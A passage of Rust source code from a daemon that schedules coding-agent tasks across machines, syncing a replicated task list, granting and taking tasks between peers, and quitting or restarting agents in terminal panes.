        let reply = reply.and_then(|r| if r["ok"] == true { Ok(r) } else { Err(format!("{} [{}]", r["error"]["message"].as_str().unwrap_or("refused"), r["error"]["code"].as_str().unwrap_or("failed"))) });
        let machines = self.machines();
        match asked {
            Asked::Sync(peer) => {
                self.syncing.borrow_mut().remove(&peer);
                match reply {
                    Ok(reply) => {
                        self.came_back(&peer);
                        self.synced.borrow_mut().insert(peer.clone(), Instant::now());
                        self.take_ops(&reply["ops"]);
                        let ops = self.replica.borrow().ops_after(&self.db, &reply["vector"]).unwrap_or_default();
                        if !ops.is_empty() {
                            self.send_to(&peer, json!({ "action": "ops", "ops": replica::ops_value(&ops) }), Asked::Ops);
                        }
                    }
                    Err(why) => {
                        log!("kanna-daemon: couldn't sync the Shelf with {}: {why}", machines.name_of(&peer));
                        self.went_away(peer);
                    }
                }
            }
            Asked::Ops | Asked::Ack | Asked::Packed(..) | Asked::Unbundled(_) => {}
            Asked::Heads(moving) => self.heads_came(*moving, reply),
            Asked::Transfer(sending) => self.transferred(sending, reply),
            Asked::Ask { task, birth, owner, repo } => {
                match reply {
                    Ok(reply) => {
                        self.came_back(&owner);
                        let epoch = reply["epoch"].as_i64().unwrap_or(0);
                        log!("kanna-daemon: {} granted {task} to this machine for {repo}", machines.name_of(&owner));
                        self.take_grant(&owner, &task, &birth, epoch);
                    }
                    Err(why) if why.ends_with("[unreachable]") => {
                        log!("kanna-daemon: {task} waits: its owner {} is away ({why})", machines.name_of(&owner));
                        self.went_away(owner);
                    }
                    Err(why) => {
                        log!("kanna-daemon: {} didn't grant {task}: {why}", machines.name_of(&owner));
                        self.came_back(&owner);
                        self.refused.borrow_mut().insert(task, Instant::now() + REFUSED_WAIT);
                        self.sync_at.set(Instant::now());
                    }
                }
                self.refill();
            }
            Asked::Grant(grant) => {
                if reply.is_ok() {
                    if let Err(error) = Replica::acked(&self.db, &grant.task, &grant.birth, grant.epoch) {
                        log!("kanna-daemon: couldn't save that {} took {}: {error}", machines.name_of(&grant.to), grant.task);
                    }
                }
            }
        }
    }

    fn take_ops(&self, ops: &Value) {
        let ops = replica::ops_of(ops);
        if ops.is_empty() {
            return;
        }
        match self.replica.borrow_mut().apply(&self.db, &ops) {
            Ok(0) => return,
            Ok(_) => {}
            Err(error) => return log!("kanna-daemon: couldn't save other machines' tasks in {}: {error}", db::FILE),
        }
        self.refresh();
        self.refill();
    }

    /// Takes into this machine's waiting tasks the edits other machines made to them later than its own.
    fn refresh(&self) {
        self.give_up();
        let replica = self.replica.borrow();
        let edited: Vec<Entry> = self
            .entries
            .borrow()
            .iter()
            .filter(|e| e.folder.is_none() && e.held.is_none())
            .filter_map(|e| {
                let record = replica.record(&e.id, e.birth.as_deref()?)?;
                let newer = Entry { name: record.text("name").map(String::from).or(e.name.clone()), after: record.list("after"), on: record.list("on"), ..e.clone() };
                (newer != *e).then_some(newer)
            })
            .collect();
        drop(replica);
        for entry in edited {
            log!("kanna-daemon: {} was edited on another machine", entry.id);
            if self.store(&entry, Place::Shelf, None, Some(Change::new("edited").by(Some("daemon")))).is_ok() {
                if let Some(found) = self.entries.borrow_mut().iter_mut().find(|e| e.id == entry.id) {
                    *found = entry;
                }
                self.changed();
            }
        }
    }

    /// Gives up this machine's waiting tasks that another machine ran while this one was away.
    fn give_up(&self) {
        let starting: HashSet<String> = self.pending.borrow().values().map(|p| p.entry.id.clone()).chain(self.launching.borrow().iter().cloned()).collect();
        let replica = self.replica.borrow();
        let taken: Vec<(Entry, String)> = self
            .entries
            .borrow()
            .iter()
            .filter(|e| e.folder.is_none() && e.held.is_none() && !starting.contains(&e.id))
            .filter_map(|e| {
                let record = replica.record(&e.id, e.birth.as_deref()?)?;
                let by = record.runs().into_iter().find(|device| *device != replica.me())?;
                Some((e.clone(), by.to_string()))
            })
            .collect();
        drop(replica);
        for (entry, by) in taken {
            let name = self.machines().name_of(&by);
            let birth = entry.birth.clone().unwrap_or_default();
            let change = Change::new("taken").moved(Place::Shelf, Place::Done).by(Some("daemon")).with("to", json!(name));
            match self.db.put_with(&entry.row(Place::Done, None), Some(&change), |conn| replica::yielded(conn, &entry.id, &birth, &by)) {
                Ok(()) => {
                    log!("kanna-daemon: {} ran on {name} while this machine was away, so it leaves this Shelf", entry.id);
                    self.take(&entry.id);
                    self.changed();
                }
                Err(error) => log!("kanna-daemon: couldn't give {} up to {name}: {error}", entry.id),
            }
        }
    }

    fn take_grant(&self, from: &str, task: &str, birth: &str, epoch: i64) -> bool {
        let taken = self.replica.borrow_mut().receive(&self.db, task, birth, epoch);
        match taken {
            Ok(_) => {
                self.adopt();
                self.refill();
                self.sync_at.set(Instant::now());
                self.send_to(from, json!({ "action": "ack", "task": task, "birth": birth, "epoch": epoch }), Asked::Ack);
                true
            }
            Err(error) => {
                log!("kanna-daemon: couldn't save the grant of {task}: {error}");
                false
            }
        }
    }

    fn grant_to(&self, peer: &str, task: &str, birth: &str) -> Result<Map, KmuxError> {
        let name = self.machines().name_of(peer);
        let refuse = |code: &str, why: String| Err(KmuxError::new(code, why));
        let Some(entry) = self.entries.borrow().iter().find(|e| e.id == task && e.birth.as_deref() == Some(birth)).cloned() else {
            return refuse("not_owner", format!("{task} isn't on this machine's Shelf"));
        };
        let starting = self.pending.borrow().values().any(|p| p.entry.id == task) || self.launching.borrow().contains(task);
        if entry.folder.is_some() || entry.held.is_some() || starting {
            return refuse("started", format!("{task} has started here"));
        }
        if !self.waits(&entry).is_empty() {
            return refuse("blocked", format!("{task} waits for {}", self.waits(&entry).join(", ")));
        }
        if !entry.on.is_empty() && !entry.on.contains(&name) {
            return refuse("not_there", format!("{task} runs on {}", entry.on.join(", ")));
        }
        if self.ambiguous(task) {
            return refuse("ambiguous", format!("another machine made a task {task} too"));
        }
        let row = entry.row(Place::Done, None);
        let change = Change::new("granted").moved(Place::Shelf, Place::Done).by(Some("daemon")).with("to", json!(name));
        let grant = self.replica.borrow_mut().grant(&self.db, task, birth, peer, |conn| db::put_row(conn, &row, Some(&change))).map_err(|why| KmuxError::new("refused", format!("{task}: {why}")))?;
        log!("kanna-daemon: granted {task} to {name}");
        self.take(task);
        self.changed();
        self.sync_at.set(Instant::now());
        Ok(Map::from_iter([("epoch".to_string(), json!(grant.epoch))]))
    }

    fn replica_command(&self, args: &Value) -> Result<Map, KmuxError> {
        let action = string(args, "action").unwrap_or_default();
        if action == "list" {
            let replica = self.replica.borrow();
            let records = replica.records().map(|r| r.to_value()).collect();
            let held = Replica::held(&self.db).unwrap_or_default().into_iter().map(|(task, birth, a)| {
                let mut value = Value::Object(replica::authority_value(&a));
                value["task"] = json!(task);
                value["birth"] = json!(birth);
                value
            });
            return Ok(Map::from_iter([("device".to_string(), json!(replica.me())), ("records".to_string(), Value::Array(records)), ("authority".to_string(), Value::Array(held.collect()))]));
        }
        let Some(peer) = string(args, kanna_net::PEER).map(String::from) else {
            return Err(bad("replica is for another machine's daemon, over a sync stream"));
        };
        self.came_back(&peer);
        let task = string(args, "task").unwrap_or_default();
        let birth = string(args, "birth").unwrap_or_default();
        match action {
            "sync" => {
                let replica = self.replica.borrow();
                let ops = replica.ops_after(&self.db, &args["vector"]).map_err(|e| KmuxError::new("failed", e.to_string()))?;
                Ok(Map::from_iter([("ops".to_string(), replica::ops_value(&ops)), ("vector".to_string(), replica.vector())]))
            }
            "ops" => {
                self.take_ops(&args["ops"]);
                Ok(Map::new())
            }
            "ask" => self.grant_to(&peer, task, birth),
            "grant" => match self.take_grant(&peer, task, birth, args["epoch"].as_i64().unwrap_or(0)) {
                true => Ok(Map::new()),
                false => Err(KmuxError::new("failed", format!("couldn't save the grant of {task}"))),
            },
            "ack" => {
                Replica::acked(&self.db, task, birth, args["epoch"].as_i64().unwrap_or(0)).map_err(|e| KmuxError::new("failed", e.to_string()))?;
                Ok(Map::new())
            }
            "heads" => self.heads_here(args),
            other => Err(bad(format!("unknown replica action \"{other}\" (sync, ops, ask, grant, ack, heads, transfer or list)"))),
        }
    }

    fn note(&self, pane: &str, change: Change) {
        let Some(id) = self.task_of(pane) else { return };
        if let Err(error) = self.db.log(&id, &change) {
            log!("kanna-daemon: couldn't save {id}'s {} in {}: {error}", change.what, db::FILE);
        }
    }

    pub fn refs(&self) -> Vec<kanna_log::TaskRef> {
        let worktree = |e: &Entry| e.folder.clone().unwrap_or_else(|| Path::new(&e.repo).join(WORKTREES).join(&e.id).to_string_lossy().into_owned());
        let open = |e: &Entry, place: Place| kanna_log::TaskRef { id: e.id.clone(), name: e.name.clone(), place: place.as_str().into(), repo: e.repo.clone(), worktree: Some(worktree(e)), branch: None, tip: None };
        let mut refs: Vec<kanna_log::TaskRef> = self.running.borrow().iter().map(|r| open(&r.entry, r.place)).collect();
        refs.extend(self.entries.borrow().iter().map(|e| open(e, Place::Shelf)));
        let ended = self.db.ended_tips().unwrap_or_default();
        refs.extend(ended.into_iter().map(|(id, repo, name, branch, tip)| kanna_log::TaskRef { id, name, place: Place::Done.as_str().into(), repo, worktree: None, branch: Some(branch), tip: Some(tip) }));
        refs
    }

    pub fn entry(&self, id: &str) -> Option<Entry> {
        self.known(id)
    }

    pub fn task_in_folder(&self, folder: &Path) -> Option<Entry> {
        let inside = |entry: &Entry| entry.folder.as_deref().is_some_and(|f| folder.starts_with(f) || same_folder(Path::new(f), folder));
        let running: Vec<Entry> = self.running.borrow().iter().map(|r| r.entry.clone()).collect();
        running.into_iter().chain(self.entries.borrow().iter().cloned()).find(inside)
    }

    pub fn task_of(&self, pane: &str) -> Option<String> {
        let running = self.running.borrow().iter().find(|r| r.pane == pane).map(|r| r.entry.id.clone());
        running.or_else(|| self.entries.borrow().iter().find(|e| e.held.as_deref() == Some(pane)).map(|e| e.id.clone()))
    }

    fn changed(&self) {
        self.follow();
        if let Some(on_change) = self.on_change.borrow().as_ref() {
            on_change(self.view());
        }
    }

    pub fn mark_changed(&self) {
        self.dirty.set(true);
    }

    pub fn exited(self: &Rc<Self>, pane: &str, code: i32) {
        let setting = self.setting_up.borrow_mut().remove(pane);
        if let Some(setting) = setting {
            self.set_up(pane, &setting);
        }
        let tearing = self.tearing_down.borrow_mut().remove(pane);
        if let Some(tearing) = tearing {
            return self.torn_down(pane, tearing, code);
        }
        self.turns.borrow_mut().remove(pane);
        self.ready.borrow_mut().remove(pane);
        self.warned.borrow_mut().remove(pane);
        let quitting = self.quitting.borrow_mut().remove(pane);
        if let Some(quitting) = quitting {
            return self.quitted(pane, quitting);
        }
        if !self.stopping.borrow_mut().remove(pane) {
            self.note(pane, Change::new("exited").by(Some("daemon")).with("code", json!(code)));
        }
        self.refill();
    }

    pub fn status(&self, pane: &str, status: Option<&str>, ended: bool) {
        let now = Instant::now();
        let status = status.and_then(Status::parse);
        let mut ready = self.ready.borrow_mut();
        let ready = ready.entry(pane.to_string()).or_insert_with(|| Ready::new(now));
        if ended && status == Some(Status::Idle) {
            ready.see(Some(Status::Working), now);
        }
        ready.see(status, now);
        if let Some(turn) = self.turns.borrow_mut().get_mut(pane) {
            if ended {
                turn.see(Some(Status::Working), now);
            }
            turn.see(status, now);
        }
        self.find_session(pane);
    }

    fn find_session(&self, pane: &str) {
        let found = |entry: &Entry| Some(entry).filter(|e| e.session.is_none() && e.folder.is_some()).map(|e| e.clone().resumable()).filter(|e| e.session.is_some());
        let running = self.running.borrow().iter().find(|r| r.pane == pane).map(|r| (r.entry.clone(), r.place));
        let (entry, place) = match running {
            Some((entry, place)) => (found(&entry), place),
            None => (self.entries.borrow().iter().find(|e| e.held.as_deref() == Some(pane)).and_then(found), Place::Shelf),
        };
        let Some(entry) = entry else { return };
        let _ = self.store(&entry, place, Some(pane), Some(Change::new("session").by(Some("daemon")).with("session", opt(entry.session.as_deref()))));
        if let Some(r) = self.running.borrow_mut().iter_mut().find(|r| r.pane == pane) {
            r.entry.session = entry.session.clone();
        }
        if let Some(found) = self.entries.borrow_mut().iter_mut().find(|e| e.id == entry.id) {
            found.session = entry.session.clone();
        }
        if let Some(core) = self.core.upgrade() {
            core.set_command(pane, entry.command(None));
        }
    }

    fn refill(&self) {
        self.fill_at.set(Some(Instant::now()));
    }

    fn running_on_shelf(&self, core: &CoreHandle) -> Vec<(String, Entry)> {
        self.entries.borrow().iter().filter_map(|e| e.held.clone().filter(|pane| alive(core, pane)).map(|pane| (pane, e.clone()))).collect()
    }

    pub fn tick(self: &Rc<Self>) -> Option<Instant> {
        let now = Instant::now();
        let core = self.core.upgrade()?;
        let running = self.running_on_shelf(&core);
        {
            let mut turns = self.turns.borrow_mut();
            let quitting = self.quitting.borrow();
            for (pane, _) in &running {
                if !quitting.contains_key(pane) {
                    turns.entry(pane.clone()).or_insert_with(|| {
                        let mut turn = Turn::underway();
                        turn.see(core.pane(pane).and_then(|p| p.status).as_deref().and_then(Status::parse), now);
                        turn
                    });
                }
            }
        }
        let late: Vec<(String, String)> = self.quitting.borrow_mut().iter_mut().filter(|(_, q)| q.by <= now && !q.hung_up).map(|(pane, q)| {
            q.hung_up = true;
            (pane.clone(), q.agent.clone())
        }).collect();
        for (pane, agent) in late {
            log!("kanna-daemon: {agent} in {pane} didn't quit in {}s, so it's hung up", QUIT_WAIT.as_secs());
            core.end(&pane, |_| {});
        }
        let pressing: Vec<String> = self.quitting.borrow().iter().filter(|(_, q)| !q.hung_up && q.next.is_some_and(|at| at <= now)).map(|(pane, _)| pane.clone()).collect();
        for pane in pressing {
            if self.line_mode.borrow().as_ref().is_some_and(|line_mode| line_mode(&pane)) {
                if let Some(q) = self.quitting.borrow_mut().get_mut(&pane) {
                    q.keys.clear();
                    q.next = None;
                }
                continue;
            }
            self.press(&pane);
        }
        let settled: Vec<(String, SettingUp)> = self.setting_up.borrow().iter().filter(|(_, s)| task_scripts::setup(&s.worktree).is_some()).map(|(p, s)| (p.clone(), s.clone())).collect();
        for (pane, setting) in settled {
            self.setting_up.borrow_mut().remove(&pane);
            self.set_up(&pane, &setting);
        }
        let mail = self.deliver(&core, now);
        let over: Vec<(String, Status)> = self.turns.borrow().iter().filter(|(pane, _)| !(self.has_mail(pane) && self.ready.borrow().get(*pane).is_some_and(|r| r.at().is_some()))).filter(|(pane, _)| !self.setting_up.borrow().contains_key(*pane)).filter_map(|(pane, turn)| turn.ended(now).map(|why| (pane.clone(), why))).collect();
        for (pane, why) in over {
            let Some((_, entry)) = running.iter().find(|(p, _)| *p == pane) else { continue };
            if runners(&config_files(Path::new(&entry.repo))) == 0 {
                self.turns.borrow_mut().insert(pane, Turn::default());
                continue;
            }
            self.quit(&pane, entry, why);
        }
        if self.fill_at.get().is_some_and(|at| at <= now) {
            self.fill_at.set(Some(now + FILL_EVERY));
            self.fill(&core);
            self.follow();
        }
        if self.sync_at.get() <= now {
            self.sync_at.set(now + SYNC_EVERY);
            self.sync_all();
        }
        let turns = self.turns.borrow().values().filter_map(Turn::due).min();
        let quits = self.quitting.borrow().values().filter(|q| !q.hung_up).flat_map(|q| [Some(q.by), q.next]).flatten().min();
        let setups = (!self.setting_up.borrow().is_empty()).then(|| now + SETUP_EVERY);
        let news = self.tell_planners(now);
        [turns, quits, setups, self.fill_at.get(), mail, news, Some(self.sync_at.get())].into_iter().flatten().min()
    }

    pub fn too_old(self: &Rc<Self>, pane: &str, why: &str) -> Option<String> {
        let Some(core) = self.core.upgrade().filter(|core| alive(core, pane)) else { return None };
        let agent = core.pane(pane).and_then(|p| p.command).unwrap_or_default();
        let Some(id) = self.task_of(pane) else {
            if !self.planners().iter().any(|p| p == pane) {
                return None;
            }
            log!("kanna-daemon: the planner in {pane} is refused: {why}");
            self.end_agent(pane, &agent, |_| {});
            return Some("the planning agent".into());
        };
        log!("kanna-daemon: {id}'s agent in {pane} is refused: {why}");
        self.failed.borrow_mut().insert(id.clone());
        let name = self.known(&id).and_then(|e| e.name).unwrap_or_else(|| id.clone());
        let agent = self.pane_entry(pane).map_or(agent, |e| e.agent);
        let (this, closing, why) = (Rc::downgrade(self), pane.to_string(), why.to_string());
        self.end_agent(pane, &agent, move |session| {
            let Some(this) = this.upgrade() else { return };
            this.keep_session(&closing, session.clone());
            this.note(&closing, Change::new("refused").by(Some("daemon")).with("why", json!(why)));
            if this.entries.borrow().iter().any(|e| e.held.as_deref() == Some(closing.as_str())) {
                this.stopped_by_itself(&closing, "too-old", session);
            } else {
                this.note(&closing, Change::new("stopped").by(Some("daemon")).with("why", json!("too-old")));
            }
            if let Some(core) = this.core.upgrade() {
                core.hang_up(&closing, |_| {});
            }
        });
        Some(name)
    }

    fn quit(self: &Rc<Self>, pane: &str, entry: &Entry, why: Status) {
        let Some(core) = self.core.upgrade() else { return };
        let why = if why == Status::NeedsYou { "needs-you" } else { "finished" };
        log!("kanna-daemon: {}'s agent {pane} is {why}, so it stops", entry.id);
        let (this, id) = (Rc::downgrade(self), pane.to_string());
        self.end_agent(pane, &entry.agent, move |session| {
            if let Some(this) = this.upgrade() {
                this.stopped_by_itself(&id, why, session);
            }
        });
        core.hang_up(pane, |_| {});
    }

    pub fn end_agent(self: &Rc<Self>, pane: &str, agent: &str, then: impl FnOnce(Option<String>) + 'static) {
        let Some(core) = self.core.upgrade().filter(|core| alive(core, pane)) else { return then(None) };
        if let Some(quitting) = self.quitting.borrow_mut().get_mut(pane) {
            return quitting.then.push(Box::new(then));
        }
        self.turns.borrow_mut().remove(pane);
        let known = kanna_detect::program::known_agent(program(agent));
        let quit = known.and_then(Quit::of);
        let keys = quit.as_ref().map_or(vec![], |q| q.keys.clone());
        let agent = known.unwrap_or(program(agent)).to_string();
        let none = keys.is_empty();
        self.quitting.borrow_mut().insert(pane.to_string(), Quitting { agent: agent.clone(), by: Instant::now() + QUIT_WAIT, quit, hung_up: none, keys, next: None, then: vec![Box::new(then)] });
        if none {
            log!("kanna-daemon: {agent} in {pane} has no quit keys, so it's hung up");
            return core.end(pane, |_| {});
        }
        self.press(pane);
    }

    fn press(&self, pane: &str) {
        let Some(core) = self.core.upgrade() else { return };
        let (key, agent) = {
            let mut quitting = self.quitting.borrow_mut();
            let Some(q) = quitting.get_mut(pane) else { return };
            if q.keys.is_empty() {
                q.next = None;
                return;
            }
            let key = q.keys.remove(0);
            q.next = (!q.keys.is_empty()).then(|| Instant::now() + KEY_WAIT);
            (key, q.agent.clone())
        };
        let (weak, pane) = (core.weak(), pane.to_string());
        core.handle(json!({ "cmd": "send-key", "args": { "pane": pane, "keys": [key] } }), move |sent| {
            let (Some(error), Some(core)) = (failed(&sent), weak.upgrade()) else { return };
            if alive(&core, &pane) {
                log!("kanna-daemon: couldn't type {agent}'s quit keys in {pane} ({}), so it's hung up", error.message);
                core.end(&pane, |_| {});
            }
        });
    }

    fn quitted(self: &Rc<Self>, pane: &str, quitting: Quitting) {
        let Some(core) = self.core.upgrade() else { return };
        core.handle(json!({ "cmd": "read", "args": { "pane": pane } }), move |reply| {
            let text = string(&reply, "text").unwrap_or_default();
            let session = quitting.quit.as_ref().and_then(|q| q.session_in(text));
            for then in quitting.then {
                then(session.clone());
            }
        });
    }

    fn pane_entry(&self, pane: &str) -> Option<Entry> {
        let waiting = self.entries.borrow().iter().find(|e| e.held.as_deref() == Some(pane)).cloned();
        waiting.or_else(|| self.running.borrow().iter().find(|r| r.pane == pane).map(|r| r.entry.clone()))
    }

    fn keep_session(&self, pane: &str, session: Option<String>) {
        let Some(session) = session else { return };
        let waiting = self.entries.borrow_mut().iter_mut().find(|e| e.held.as_deref() == Some(pane)).map(|e| {
            e.session.get_or_insert_with(|| session.clone());
            (e.clone(), Place::Shelf)
        });
        let found = waiting.or_else(|| {
            self.running.borrow_mut().iter_mut().find(|r| r.pane == pane).map(|r| {
                r.entry.session.get_or_insert_with(|| session.clone());
                (r.entry.clone(), r.place)
            })
        });
        if let Some((entry, place)) = found {
            let _ = self.store(&entry, place, Some(pane), None);
        }
    }

    fn stopped_by_itself(&self, pane: &str, why: &str, session: Option<String>) {
        let Some(mut entry) = self.entries.borrow().iter().find(|e| e.held.as_deref() == Some(pane)).cloned() else { return };
        entry.stopped = Some(why.to_string());
        if entry.session.is_none() {
            entry.session = session;
        }
        let change = Change::new("stopped").by(Some("daemon")).with("why", json!(why)).with("session", opt(entry.session.as_deref()));
        let _ = self.store(&entry, Place::Shelf, Some(pane), Some(change));
        if let Some(found) = self.entries.borrow_mut().iter_mut().find(|e| e.id == entry.id) {
            *found = entry;
        }
        self.changed();
        self.refill();
    }

    fn fill(self: &Rc<Self>, core: &CoreHandle) {
        self.adopt();
        let entries = self.entries.borrow().clone();
        let machines = self.machines();
        let now = Instant::now();
        let repos = self.clones();
        let starting: HashSet<String> = self.pending.borrow().values().map(|p| p.entry.id.clone()).chain(self.launching.borrow().iter().cloned()).collect();
        let asking: Vec<(String, String)> = self.asked.borrow().values().filter_map(|a| if let Asked::Ask { repo, task, .. } = a { Some((repo.clone(), task.clone())) } else { None }).collect();
        let mut asked: HashSet<String> = asking.iter().map(|(_, task)| task.clone()).collect();
        self.refused.borrow_mut().retain(|_, until| *until > now);
        let heard = self.heard_from_all(&machines);
        for repo in repos {
            let slots = runners(&config_files(Path::new(&repo)));
            if slots == 0 || self.placed(&repo).is_err() {
                continue;
            }
            let mine: Vec<&Entry> = entries.iter().filter(|e| e.repo == repo).collect();
            let mut busy = mine.iter().filter(|e| starting.contains(&e.id) || e.held.as_deref().is_some_and(|pane| alive(core, pane))).count() + asking.iter().filter(|(r, _)| *r == repo).count();
            let mail: HashSet<String> = self.waiting.borrow().iter().map(|m| m.recipient.clone()).collect();
            let ending = |pane: &str| self.quitting.borrow().contains_key(pane) || self.stopping.borrow().contains(pane) || self.tearing_down.borrow().contains_key(pane);
            let mut woken: Vec<&&Entry> = mine.iter().filter(|e| mail.contains(&e.id) && messages::AGENTS.contains(&program(&e.agent)) && (e.folder.is_some() || e.held.is_some()) && !starting.contains(&e.id) && !self.failed.borrow().contains(&e.id) && !e.held.as_deref().is_some_and(|pane| alive(core, pane) || ending(pane)) && self.moving_to(&e.id).is_none()).collect();
            woken.sort_by(|a, b| db::oldest_first((a.made_at, &a.id), (b.made_at, &b.id)));
            for entry in woken {
                if busy >= slots {
                    break;
                }
                busy += 1;
                log!("kanna-daemon: {} has a message, so it runs on the Shelf ({busy} of {slots} in {repo})", entry.id);
                self.wake(core, (*entry).clone());
            }
            let mut waiting: Vec<(bool, Hlc, Candidate)> = mine
                .iter()
                .filter(|e| e.folder.is_none() && e.held.is_none() && !starting.contains(&e.id) && !self.failed.borrow().contains(&e.id) && self.waits(e).is_empty() && allowed(&e.on, &machines.me.name) && !self.ambiguous(&e.id) && self.conflicted(e).is_none())
                .filter(|e| heard || e.birth.is_none() || e.on == [machines.me.name.clone()])
                .map(|e| (mail.contains(&e.id), order(e), Candidate::Here((*e).clone())))
                .collect();
            let others = || {
                let replica = self.replica.borrow();
                let any = replica.records().any(|r| r.text("state") == Some("waiting") && r.text("owner").is_some_and(|o| o != replica.me()));
                any
            };
            if let Some(project) = others().then(|| identity(&repo)).flatten() {
                let replica = self.replica.borrow();
                for record in replica.records() {
                    let owner = record.text("owner").unwrap_or_default();
                    let eligible = record.text("project") == Some(project.as_str())
                        && record.text("state") == Some("waiting")
                        && !owner.is_empty()
                        && owner != replica.me()
                        && !self.is_open(&record.task)
                        && !asked.contains(&record.task)
                        && replica.births(&record.task).len() == 1
                        && allowed(&record.list("on"), &machines.me.name)
                        && !self.refused.borrow().contains_key(&record.task)
                        && record.list("after").iter().all(|id| !self.is_open(id) && !replica.open_task(id));
                    let (task, birth, owner) = (record.task.clone(), record.birth.clone(), owner.to_string());
                    if eligible && self.away_long(&owner, now) {
                        waiting.push((false, record.born(), Candidate::Take { task, birth, owner }));
                    } else if eligible && !self.is_away(&owner, now) {
                        waiting.push((false, record.born(), Candidate::There { task, birth, owner }));
                    }
                }
            }
            waiting.sort_by(|a, b| b.0.cmp(&a.0).then_with(|| a.1.cmp(&b.1)));
            for (_, _, candidate) in waiting {
                if busy >= slots {
                    break;
                }
                busy += 1;
                match candidate {
                    Candidate::Here(entry) => {
                        let (this, id) = (Rc::downgrade(self), entry.id.clone());
                        log!("kanna-daemon: {id} runs on the Shelf ({busy} of {slots} in {repo})");
                        self.prepare(entry, None, Some("daemon".into()), Answer::Then(Box::new(move |result| {
                            if let (Err(error), Some(this)) = (result, this.upgrade()) {
                                log!("kanna-daemon: {id} couldn't run on the Shelf: {}", error.message);
                                if error.code != "conflict" {
                                    this.failed.borrow_mut().insert(id);
                                }
                            }
                        })));
                    }
                    Candidate::There { task, birth, owner } => {
                        log!("kanna-daemon: asks {} for {task} ({busy} of {slots} in {repo})", machines.name_of(&owner));
                        asked.insert(task.clone());
                        let args = json!({ "action": "ask", "task": task, "birth": birth });
                        self.send_to(&owner.clone(), args, Asked::Ask { task, birth, owner, repo: repo.clone() });
                    }
                    Candidate::Take { task, birth, owner } => {
                        log!("kanna-daemon: {task}'s owner {} has been away {}s, so it runs here ({busy} of {slots} in {repo})", machines.name_of(&owner), takeover_after().as_secs());
                        asked.insert(task.clone());
                        if let Err(error) = self.replica.borrow_mut().take(&self.db, &task, &birth, &owner) {
                            log!("kanna-daemon: couldn't take {task}: {error}");
                            continue;
                        }
                        self.sync_at.set(Instant::now());
                        self.adopt();
                        let Some(entry) = self.entries.borrow().iter().find(|e| e.id == task).cloned() else { continue };
                        let this = Rc::downgrade(self);
                        self.prepare(entry, None, Some("daemon".into()), Answer::Then(Box::new(move |result| {
                            if let (Err(error), Some(this)) = (result, this.upgrade()) {
                                log!("kanna-daemon: {task} couldn't run on the Shelf: {}", error.message);
                                this.failed.borrow_mut().insert(task);
                            }
                        })));
                    }
                }
            }
        }
    }

    fn wake(self: &Rc<Self>, core: &CoreHandle, entry: Entry) {
        let id = entry.id.clone();
        let this = Rc::downgrade(self);
        let failed = move |error: KmuxError| {
            log!("kanna-daemon: {id} couldn't run for its message: {}", error.message);
            if let Some(this) = this.upgrade() {
                this.failed.borrow_mut().insert(id);
            }
        };
        match entry.held.clone().filter(|pane| core.pane(pane).is_some()) {
            Some(pane) => {
                self.launching.borrow_mut().insert(entry.id.clone());
                let (this, id) = (Rc::downgrade(self), entry.id.clone());
                self.revive(&pane, Some(self.again(&entry)), move |result| {
                    let Some(this) = this.upgrade() else { return };
                    this.launching.borrow_mut().remove(&id);
                    match result {
                        Ok(pane) => {
                            this.restarted(&pane);
                            this.note(&pane, Change::new("started").by(Some("daemon")).with("why", json!("message")));
                        }
                        Err(error) => failed(error),
                    }
                });
            }
            None => self.prepare(Entry { held: None, ..entry }, None, Some("daemon".into()), Answer::Then(Box::new(move |result| {
                if let Err(error) = result {
                    failed(error);
                }
            }))),
        }
    }

    pub fn sweep(&self) {
        if !self.dirty.replace(false) {
            return;
        }
        let Some(core) = self.core.upgrade() else { return };
        let gone: Vec<Running> = self.running.borrow().iter().filter(|r| core.pane(&r.pane).is_none()).cloned().collect();
        let freed = !gone.is_empty();
        for r in gone {
            log!("kanna-daemon: {}'s agent {} is closed, so {} is done", r.entry.id, r.pane, r.entry.id);
            self.closing(&r.entry.id);
            self.running.borrow_mut().retain(|x| x.pane != r.pane);
            let by = self.ending.borrow_mut().remove(&r.pane).flatten().unwrap_or_else(|| "daemon".into());
            let _ = self.store(&r.entry, Place::Done, None, Some(Change::new("done").moved(r.place, Place::Done).by(Some(&by)).with("pane", json!(r.pane)).with("branch", opt(r.entry.folder.as_deref().and_then(branch_of).as_deref()))));
            self.tell_planner(&r.entry, What::Ended { on_desk: true }, Some(&by));
            self.setting_up.borrow_mut().remove(&r.pane);
            self.tearing_down.borrow_mut().remove(&r.pane);
            self.finish(&r.entry);
        }
        let renamed: Vec<(Running, Option<String>)> = self
            .running
            .borrow_mut()
            .iter_mut()
            .filter_map(|r| {
                let name = core.pane(&r.pane)?.name.filter(|n| r.entry.name.as_ref() != Some(n))?;
                let old = r.entry.name.replace(name);
                Some((r.clone(), old))
            })
            .collect();
        for (r, old) in renamed {
            let _ = self.store(&r.entry, r.place, Some(&r.pane), Some(Change::new("renamed").with("from", opt(old.as_deref()))));
        }
        let lost: Vec<Entry> = self
            .entries
            .borrow_mut()
            .iter_mut()
            .filter(|e| e.held.as_ref().is_some_and(|pane| core.pane(pane).is_none()))
            .map(|e| {
                e.held = None;
                e.clone()
            })
            .collect();
        for entry in lost {
            let _ = self.store(&entry, Place::Shelf, None, None);
        }
        if freed {
            self.changed();
        }
    }

    fn renamed(&self, from: &str, to: &str) {
        fn rekey<T>(map: &RefCell<HashMap<String, T>>, from: &str, to: &str) {
            let moved = map.borrow_mut().remove(from);
            if let Some(value) = moved {
                map.borrow_mut().insert(to.into(), value);
            }
        }
        rekey(&self.turns, from, to);
        rekey(&self.quitting, from, to);
        rekey(&self.setting_up, from, to);
        rekey(&self.tearing_down, from, to);
        rekey(&self.warned, from, to);
        self.ready.borrow_mut().remove(from);
        if self.delivering.borrow_mut().remove(from) {
            self.delivering.borrow_mut().insert(to.into());
        }
        for (pane, _) in self.posting.borrow_mut().values_mut().filter(|(pane, _)| pane == from) {
            *pane = to.into();
        }
        if self.stopping.borrow_mut().remove(from) {
            self.stopping.borrow_mut().insert(to.into());
        }
        let moved: Vec<(Entry, Place)> = self.running.borrow_mut().iter_mut().filter(|r| r.pane == from).map(|r| {
            r.pane = to.into();
            (r.entry.clone(), r.place)
        }).collect();
        for (entry, place) in moved {
            if let Err(error) = self.db.put(&entry.row(place, Some(to)), None) {
                log!("kanna-daemon: couldn't save {}'s new terminal {to}: {error}", entry.id);
            }
        }
        let held: Vec<Entry> = self.entries.borrow_mut().iter_mut().filter(|e| e.held.as_deref() == Some(from)).map(|e| {
            e.held = Some(to.into());
            e.clone()
        }).collect();
        for entry in held {
            if let Err(error) = self.db.put(&entry.row(Place::Shelf, Some(to)), None) {
